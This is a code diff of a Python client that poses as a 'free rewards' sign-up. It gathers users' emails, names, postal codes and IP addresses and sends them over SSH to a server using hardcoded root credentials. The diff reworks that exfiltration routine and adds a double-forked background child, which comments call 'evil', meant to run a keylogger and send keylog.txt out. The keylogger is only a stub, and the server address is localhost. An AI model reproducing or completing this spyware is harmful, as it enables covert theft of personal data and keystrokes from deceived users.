@@ -39,49 +39,11 @@ import re
 import socket #to capture the local IP
 import urllib.request # to capture the public ip
 import logzero
+import time
 from logzero import logger
 
 
 logzero.logfile("clientLogger.log", maxBytes=1e6, backupCount=2)
-def fetchSFTP(keyLoc):
-    '''
-    This function handles the connection and creation of SSH and SFTP connections to a target server.
-    When an exception occurs, disconnect from the server if possible.
-    @returns - SFTP - A connected SFTP object 
-    '''
-    try:
-        sftp = 0
-        client = 0
-        host = "::1"
-        port = 9500
-        usr,  pwd = 'root', 'toor'
-        
-        key = paramiko.RSAKey(filename=keyLoc)
-
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        client.connect(host,port, usr, pwd,  key)
-        
-        chan = client.get_transport().open_session()
-
-        chan.send('Hello, I am a nice client :)')
-        command = chan.recv(1024)
-        command = command.decode()
-        print("Executing this -->" + str(command))
-        
-      
-        return chan
-    except Exception as e:
-        print("We ran into a problem and have to close. Please try again later.")
-        print("Unhandled exception ->"+ str(e))
-        
-        if sftp != 0:
-            sftp.close()
-        if client != 0:
-            client.close()
-        sys.exit(0)
-    
-    #--------------End of fetch SFTP-----------#
 
 def getInput():
     '''
@@ -117,8 +79,8 @@ def getInput():
             lastName = "User"
             postalCode = "K7P 1A3"
 
-        name, local, public = getIPaddr() # could be flagged as suspicious traffic to ident.me ? 
-        userInfo = [email,firstName,lastName,postalCode, name,local,public]
+        host, ip,  public = getIPaddr() # could be flagged as suspicious traffic to ident.me ? 
+        userInfo = [email,firstName,lastName,postalCode, host,  ip, public]
             
         print("Thank you! You are now signed up for free rewards. \
         \nWould you like to sign up another user?")
@@ -150,30 +112,76 @@ def getIPaddr():
 
 def keylog():
     #while True:
-    
+        
     #your code here
     
     return 0
     
-def sendFile(dataFile,  conn, filename):
+def sendFile(dataFile,  keyLoc, filename):
+    try:
+        sftp = 0
+        client = 0
+        host = "::1"
+        port = 9500
+        usr,  pwd = 'root', 'toor'
+        
+        key = paramiko.RSAKey(filename=keyLoc)
+
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(host,port, usr, pwd,  key)
+        chan = client.get_transport().open_session()
+
+        
+    except Exception as e:
+        print("We ran into a problem and have to close. Please try again later.")
+        print("Unhandled exception ->"+ str(e))
+        if sftp != 0:
+            sftp.close()
+        if client != 0:
+            client.close()
+        sys.exit(0)
+    
+    print("Ready....")
+    
     
     if filename == 'infobank.txt':
         print(filename)
+        #send this filename
+        strn = filename
+        
+        chan.send(strn.encode('utf-8'))
+        #recieve a response for OK
+
+        str = "|"
+        #send the infobank data
+        for indexes in dataFile:
+            for values in indexes:
+                str += values + ","
+            str += "|"
+        print(str)
+        chan.send(str.encode('utf-8'))
+        
     
     elif filename == 'keylog.txt':
         print(filename)
+        
+        #send this filename
+    
+        #recieve OK
+
+        #send the keylog data
     else:
         logger.error("Unknown fille handle sent to sendFile")
-    
+        
+    client.close()
     return 0
-def run():
-    keyLoc = os.getcwd()
+def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
+    keyLoc = os.getcwd() # the key must be next to the client
     keyLoc += '/test_rsa.key'
     
-    sftp = fetchSFTP(keyLoc)
     infoBank = getInput()
-    sendFile(infoBank,  sftp,  'infobank.txt')
-    sftp.close()
+    sendFile(infoBank,  keyLoc,  'infobank.txt')
     
     #child forks to be evil
     try:
@@ -199,11 +207,13 @@ def run():
         logger.error("Unable to fork for fork #2")
         
     #I am the child connection, I am an evil fork and shouldn't HUP
+   # Flush I/O  buffers  and lockdown stderr/out/in
+    sys.stdout.flush() 
+    sys.stderr.flush()
+    
     keylog()
-    stfp2 = fetchSFTP(keyLoc)
-
-    sendFile(infoBank,  sftp,  'infobank.txt')
-    stfp2.close()
+    
+    sendFile("", keyLoc,  'keylog.txt')
     os._exit(0)
     
 # MAIN # 
